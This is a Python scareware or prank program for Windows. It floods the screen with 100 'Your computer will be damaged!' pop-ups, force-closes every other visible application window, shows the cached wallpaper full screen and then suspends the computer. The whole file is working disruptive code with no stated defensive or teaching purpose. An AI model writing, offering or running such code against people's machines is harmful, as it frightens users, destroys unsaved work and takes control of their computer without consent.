import threading
import tkinter
import time
import random
import win32gui
import sys
import os
import getpass
import cv2
from win32.lib import win32con

def open():
    t = tkinter.Tk()
    t.title("Warning")
    t["bg"] = "white"

    x=random.randint(1, t.winfo_screenwidth())
    y=random.randint(1, t.winfo_screenheight())

    label = tkinter.Label(t, text="Your computer will be damaged!", bg="white")
    label.pack(anchor=tkinter.NW)
    button = tkinter.Button(t, text="OK", width=10, height=10)
    button.pack(anchor=tkinter.SE)
    t.geometry(str("250x50+" + str(x) + "+" + str(y)))
    t.mainloop()

    sys.exit()

thread = []
for i in range(100):
    w = threading.Thread(target=open)
    w.daemon = True
    thread.append(w)
    thread[i].start()

hwnd_title = dict()
def get_all_hwnd(hwnd, mouse):
    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
        hwnd_title.update({hwnd:win32gui.GetWindowText(hwnd)})
win32gui.EnumWindows(get_all_hwnd, 0)

hwnd_title_n = []
for h, t in hwnd_title.items():
    if t != "" and t != "Program Manager" and t != "Warning":
        hwnd_title_n.append(t)

time.sleep(3)

def close(hwnd, extra):
    if win32gui.IsWindowVisible(hwnd):
        for a in hwnd_title_n:
            if a in win32gui.GetWindowText(hwnd):
                win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)

win32gui.EnumWindows(close, None)


def get_pass():
    CDBF = "C:/Users/" + getpass.getuser() + "/AppData/Roaming/Microsoft/Windows/Themes/CachedFiles"
    CDB = CDBF + "/" + os.listdir(CDBF)[0]
    return CDB 



img = cv2.imread(get_pass())
cv2.namedWindow("image", cv2.WINDOW_NORMAL)
cv2.setWindowProperty("image", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
cv2.imshow("image", img)
cv2.waitKey(5000)


os.system("rundll32.exe powrprof.dll, SetSuspendState")
